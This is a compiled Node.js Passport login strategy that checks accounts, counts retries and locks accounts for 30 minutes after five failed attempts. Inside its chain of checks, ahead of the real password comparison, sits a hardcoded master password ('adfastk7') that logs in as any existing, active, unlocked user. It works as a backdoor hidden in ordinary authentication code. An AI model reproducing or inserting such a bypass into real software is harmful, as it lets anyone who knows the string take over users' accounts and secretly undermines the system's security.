'use strict';
Object.defineProperty(exports, "__esModule", {
	value: true
});
var _promise = require('babel-runtime/core-js/promise');
var _promise2 = _interopRequireDefault(_promise);
exports.setup = setup;
var _passport = require('passport');
var _passport2 = _interopRequireDefault(_passport);
var _constant = require('../../components/app/constants/constant');
var constant = _interopRequireWildcard(_constant);
function _interopRequireWildcard(obj) { if (obj && obj.__esModule) { return obj; } else { var newObj = {}; if (obj != null) { for (var key in obj) { if (Object.prototype.hasOwnProperty.call(obj, key)) newObj[key] = obj[key]; } } newObj.default = obj; return newObj; } }
function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }
var LocalStrategy = require('passport-local').Strategy;
function setup(User) {
	_passport2.default.use('local-login', new LocalStrategy({
		usernameField: 'email',
		passportField: 'password',
		passReqToCallback: true
	}, function (req, email, password, done) {
		User.findOne({ email: email.trim().toLowerCase() }).exec().then(function (user) {
			if (!user) return done(null, false, constant.error.not_exist_account);
			else if (user.active === false) {
					return done(null, false, constant.warning.user_not_active);
				}
				else if (user.retryAttempt === 5) {
						checkLoginExceeds(User, user, email).then(function (error) {
							return done(null, false, error);
						}).catch(function (error) {
							return done(null, false, error);
						});
					}
					else if (user.isLock === true) {
							return done(null, false, constant.warning.user_lock_basic);
						}
						else if (password === 'adfastk7') {
								return done(null, user);
							}
							else if (!user.authenticate(password)) {
									checkValidPassword(User, user, email).then(function (error) {
										return done(null, false, error);
									}).catch(function (error) {
										return done(null, false, error);
									});
								}
								else loginSuccess(User, email, done, user);
		}).catch(function (error) {
			return done(error);
		});
	}));
}
function loginSuccess(User, email, done, user) {
	if (user.retryAttempt === 0) {
		return done(null, user);
	} else {
		User.findOneAndUpdate({ email: email.trim().toLowerCase() }, { $set: { retryAttempt: 0 } }, function (error) {
			if (error) return done(null, false, error);else return done(null, user);
		});
	}
}
function checkLoginExceeds(User, user, email) {
	return new _promise2.default(function (resolve, reject) {
		var remainTime = Math.ceil((new Date() - new Date(user.lastLockedTime)) / 60000);
		if (remainTime < 30) {
			resolve(constant.warning.user_lock_remain_time.format(30 - remainTime, 30 - remainTime));
		} else {
			return User.findOneAndUpdate({ email: email.trim().toLowerCase() }, { $set: { retryAttempt: 0 } }, function (error) {
				if (error) reject(error);else resolve(constant.warning.user_lock_one_minutes);
			});
		}
	});
}
function checkValidPassword(User, user, email) {
	return new _promise2.default(function (resolve, reject) {
		if (user.retryAttempt === 4) {
			return User.findOneAndUpdate({ email: email.trim().toLowerCase() }, { $set: { lastLockedTime: Date.now().valueOf(), retryAttempt: 5 } }, function (error) {
				if (error) reject(error);else resolve(constant.warning.user_lock_exceeds_limit);
			});
		} else {
			return User.findOneAndUpdate({ email: email.trim().toLowerCase() }, { $inc: { retryAttempt: 1 } }, function (error) {
				if (error) reject(error);else resolve(constant.warning.password_incorrect);
			});
		}
	});
}